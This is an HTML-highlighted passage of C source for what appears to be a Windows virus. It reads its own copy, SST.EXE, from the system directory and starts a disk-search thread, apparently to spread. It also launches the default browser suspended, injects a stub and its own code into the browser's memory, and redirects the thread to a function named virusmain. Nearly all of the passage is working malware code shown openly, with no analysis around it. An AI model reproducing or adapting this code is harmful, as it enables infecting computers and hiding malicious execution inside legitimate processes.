  </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">hnd</span><span class="sc10">,</span><span class="sc11">threads</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">];</span><span class="sc0">
  </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">buffer</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
  </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">aux</span><span class="sc10">;</span><span class="sc0">

  </span><span class="sc11">GetSystemDirectory</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc11">MAX_PATH</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">lstrcat</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc6">"\\SST.EXE"</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc10">((</span><span class="sc16">int</span><span class="sc10">)(</span><span class="sc11">hnd</span><span class="sc10">=</span><span class="sc11">CreateFile</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc11">GENERIC_READ</span><span class="sc10">,</span><span class="sc11">FILE_SHARE_READ</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">OPEN_EXISTING</span><span class="sc10">,</span><span class="sc11">FILE_ATTRIBUTE_NORMAL</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">))!=-</span><span class="sc4">1</span><span class="sc10">){</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">exe_mem</span><span class="sc10">=</span><span class="sc11">GlobalAlloc</span><span class="sc10">(</span><span class="sc11">GPTR</span><span class="sc10">,</span><span class="sc11">exe_size</span><span class="sc10">=</span><span class="sc11">GetFileSize</span><span class="sc10">(</span><span class="sc11">hnd</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">))){</span><span class="sc0">
      </span><span class="sc11">ReadFile</span><span class="sc10">(</span><span class="sc11">hnd</span><span class="sc10">,</span><span class="sc11">exe_mem</span><span class="sc10">,</span><span class="sc11">exe_size</span><span class="sc10">,&amp;</span><span class="sc11">aux</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc10">*((</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc10">*)(</span><span class="sc11">exe_mem</span><span class="sc10">+</span><span class="sc11">ENTRY_PTR</span><span class="sc10">+</span><span class="sc11">ENTRY_EXE_SIZE</span><span class="sc10">))=</span><span class="sc11">exe_size</span><span class="sc10">;</span><span class="sc0">
      </span><span class="sc11">threads</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]=</span><span class="sc11">CreateThread</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,&amp;</span><span class="sc11">disk_search</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,&amp;</span><span class="sc11">aux</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc11">WaitForMultipleObjects</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">,(</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc10">*)&amp;</span><span class="sc11">threads</span><span class="sc10">,</span><span class="sc11">TRUE</span><span class="sc10">,</span><span class="sc11">INFINITE</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc11">GlobalFree</span><span class="sc10">(</span><span class="sc11">exe_mem</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">hnd</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc11">ExitProcess</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">main</span><span class="sc10">(){</span><span class="sc0">
  </span><span class="sc11">STARTUPINFO</span><span class="sc0"> </span><span class="sc11">sui</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">PROCESS_INFORMATION</span><span class="sc0"> </span><span class="sc11">pi</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">CONTEXT</span><span class="sc0"> </span><span class="sc11">ctx</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">hnd</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">entry</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">ie_path</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
  </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">buffer</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
  </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">aux</span><span class="sc10">,</span><span class="sc11">aux2</span><span class="sc10">,</span><span class="sc11">sz</span><span class="sc10">,</span><span class="sc11">c</span><span class="sc10">,</span><span class="sc11">hacked</span><span class="sc10">;</span><span class="sc0">

  </span><span class="sc11">hacked</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">RegOpenKeyEx</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc6">"http\\shell\\open\\command"</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">KEY_READ</span><span class="sc10">,&amp;</span><span class="sc11">hnd</span><span class="sc10">)){</span><span class="sc0">
    </span><span class="sc11">sz</span><span class="sc10">=</span><span class="sc11">MAX_PATH</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">RegQueryValueEx</span><span class="sc10">(</span><span class="sc11">hnd</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,&amp;</span><span class="sc11">buffer</span><span class="sc10">,&amp;</span><span class="sc11">sz</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegCloseKey</span><span class="sc10">(</span><span class="sc11">hnd</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc11">aux</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">aux2</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">c</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc11">sz</span><span class="sc10">;</span><span class="sc11">sz</span><span class="sc10">--,</span><span class="sc11">aux</span><span class="sc10">++){</span><span class="sc0">
      </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">[</span><span class="sc11">aux</span><span class="sc10">]!=</span><span class="sc7">'"'</span><span class="sc10">)</span><span class="sc11">ie_path</span><span class="sc10">[</span><span class="sc11">aux2</span><span class="sc10">++]=</span><span class="sc11">buffer</span><span class="sc10">[</span><span class="sc11">aux</span><span class="sc10">];</span><span class="sc0">
        </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc11">c</span><span class="sc10">++;</span><span class="sc0">
      </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">c</span><span class="sc10">==</span><span class="sc4">2</span><span class="sc10">){</span><span class="sc0">
        </span><span class="sc11">ie_path</span><span class="sc10">[</span><span class="sc11">aux2</span><span class="sc10">]=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
      </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">((</span><span class="sc16">int</span><span class="sc10">)(</span><span class="sc11">hnd</span><span class="sc10">=</span><span class="sc11">CreateFile</span><span class="sc10">(</span><span class="sc11">ie_path</span><span class="sc10">,</span><span class="sc11">GENERIC_READ</span><span class="sc10">,</span><span class="sc11">FILE_SHARE_READ</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">OPEN_EXISTING</span><span class="sc10">,</span><span class="sc11">FILE_ATTRIBUTE_NORMAL</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">))!=-</span><span class="sc4">1</span><span class="sc10">){</span><span class="sc0">
      </span><span class="sc11">SetFilePointer</span><span class="sc10">(</span><span class="sc11">hnd</span><span class="sc10">,</span><span class="sc4">0x3c</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc11">ReadFile</span><span class="sc10">(</span><span class="sc11">hnd</span><span class="sc10">,&amp;</span><span class="sc11">entry</span><span class="sc10">,</span><span class="sc4">4</span><span class="sc10">,&amp;</span><span class="sc11">aux</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc11">SetFilePointer</span><span class="sc10">(</span><span class="sc11">hnd</span><span class="sc10">,(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">entry</span><span class="sc10">+</span><span class="sc4">0x34</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc11">ReadFile</span><span class="sc10">(</span><span class="sc11">hnd</span><span class="sc10">,&amp;</span><span class="sc11">aux2</span><span class="sc10">,</span><span class="sc4">4</span><span class="sc10">,&amp;</span><span class="sc11">aux</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc11">SetFilePointer</span><span class="sc10">(</span><span class="sc11">hnd</span><span class="sc10">,(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">entry</span><span class="sc10">+</span><span class="sc4">0x28</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc11">ReadFile</span><span class="sc10">(</span><span class="sc11">hnd</span><span class="sc10">,&amp;</span><span class="sc11">entry</span><span class="sc10">,</span><span class="sc4">4</span><span class="sc10">,&amp;</span><span class="sc11">aux</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc11">entry</span><span class="sc10">+=</span><span class="sc11">aux2</span><span class="sc10">;</span><span class="sc0">
      </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">hnd</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc11">aux</span><span class="sc10">=(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">GetProcAddress</span><span class="sc10">(</span><span class="sc11">GetModuleHandle</span><span class="sc10">(</span><span class="sc6">"KERNEL32.DLL"</span><span class="sc10">),</span><span class="sc6">"CreateMutexA"</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc10">*((</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc10">*)((</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">stub</span><span class="sc10">+</span><span class="sc11">STUB_API_PTR</span><span class="sc10">))=</span><span class="sc11">aux</span><span class="sc10">;</span><span class="sc0">
      </span><span class="sc11">aux</span><span class="sc10">=(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">GetProcAddress</span><span class="sc10">(</span><span class="sc11">GetModuleHandle</span><span class="sc10">(</span><span class="sc6">"KERNEL32.DLL"</span><span class="sc10">),</span><span class="sc6">"LoadLibraryA"</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc10">*((</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc10">*)((</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">stub</span><span class="sc10">+</span><span class="sc11">STUB_API2_PTR</span><span class="sc10">))=</span><span class="sc11">aux</span><span class="sc10">;</span><span class="sc0">
      </span><span class="sc11">memset</span><span class="sc10">(&amp;</span><span class="sc11">sui</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">STARTUPINFO</span><span class="sc10">));</span><span class="sc0">
      </span><span class="sc11">sui</span><span class="sc10">.</span><span class="sc11">cb</span><span class="sc10">=</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">STARTUPINFO</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">CreateProcess</span><span class="sc10">(</span><span class="sc11">ie_path</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">CREATE_SUSPENDED</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,&amp;</span><span class="sc11">sui</span><span class="sc10">,&amp;</span><span class="sc11">pi</span><span class="sc10">)){</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">hnd</span><span class="sc10">=</span><span class="sc11">OpenProcess</span><span class="sc10">(</span><span class="sc11">PROCESS_ALL_ACCESS</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">pi</span><span class="sc10">.</span><span class="sc11">dwProcessId</span><span class="sc10">)){</span><span class="sc0">
          </span><span class="sc11">WriteProcessMemory</span><span class="sc10">(</span><span class="sc11">hnd</span><span class="sc10">,</span><span class="sc11">entry</span><span class="sc10">,&amp;</span><span class="sc11">stub</span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">stub</span><span class="sc10">),&amp;</span><span class="sc11">aux</span><span class="sc10">);</span><span class="sc0">
          </span><span class="sc11">ResumeThread</span><span class="sc10">(</span><span class="sc11">pi</span><span class="sc10">.</span><span class="sc11">hThread</span><span class="sc10">);</span><span class="sc0">
          </span><span class="sc5">while</span><span class="sc10">(!(</span><span class="sc11">aux</span><span class="sc10">=(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">OpenMutex</span><span class="sc10">(</span><span class="sc11">STANDARD_RIGHTS_REQUIRED</span><span class="sc10">|</span><span class="sc11">SYNCHRONIZE</span><span class="sc10">|</span><span class="sc11">MUTANT_QUERY_STATE</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc19">name</span><span class="sc10">)))</span><span class="sc11">Sleep</span><span class="sc10">(</span><span class="sc4">100</span><span class="sc10">);</span><span class="sc0">
          </span><span class="sc11">SuspendThread</span><span class="sc10">(</span><span class="sc11">pi</span><span class="sc10">.</span><span class="sc11">hThread</span><span class="sc10">);</span><span class="sc0">
          </span><span class="sc11">ReleaseMutex</span><span class="sc10">((</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">aux</span><span class="sc10">);</span><span class="sc0">
          </span><span class="sc11">WriteProcessMemory</span><span class="sc10">(</span><span class="sc11">hnd</span><span class="sc10">,(</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc4">0x00401000</span><span class="sc10">,(</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc4">0x00401000</span><span class="sc10">,</span><span class="sc11">CODE_SIZE</span><span class="sc10">,&amp;</span><span class="sc11">aux</span><span class="sc10">);</span><span class="sc0">
          </span><span class="sc11">ctx</span><span class="sc10">.</span><span class="sc11">ContextFlags</span><span class="sc10">=</span><span class="sc11">CONTEXT_FULL</span><span class="sc10">;</span><span class="sc0">
          </span><span class="sc11">GetThreadContext</span><span class="sc10">(</span><span class="sc11">pi</span><span class="sc10">.</span><span class="sc11">hThread</span><span class="sc10">,&amp;</span><span class="sc11">ctx</span><span class="sc10">);</span><span class="sc0">
          </span><span class="sc11">ctx</span><span class="sc10">.</span><span class="sc11">Eip</span><span class="sc10">=(</span><span class="sc16">int</span><span class="sc10">)&amp;</span><span class="sc11">virusmain</span><span class="sc10">;</span><span class="sc0">
          </span><span class="sc11">SetThreadContext</span><span class="sc10">(</span><span class="sc11">pi</span><span class="sc10">.</span><span class="sc11">hThread</span><span class="sc10">,&amp;</span><span class="sc11">ctx</span><span class="sc10">);</span><span class="sc0">
          </span><span class="sc11">ResumeThread</span><span class="sc10">(</span><span class="sc11">pi</span><span class="sc10">.</span><span class="sc11">hThread</span><span class="sc10">);</span><span class="sc0">
          </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">hnd</span><span class="sc10">);</span><span class="sc0">
          </span><span class="sc11">hacked</span><span class="sc10">++;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
      </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">hacked</span><span class="sc10">)</span><span class="sc11">virusmain</span><span class="sc10">();</span><span class="sc0">
  </span><span class="sc11">ExitProcess</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span></div></body>
</html>
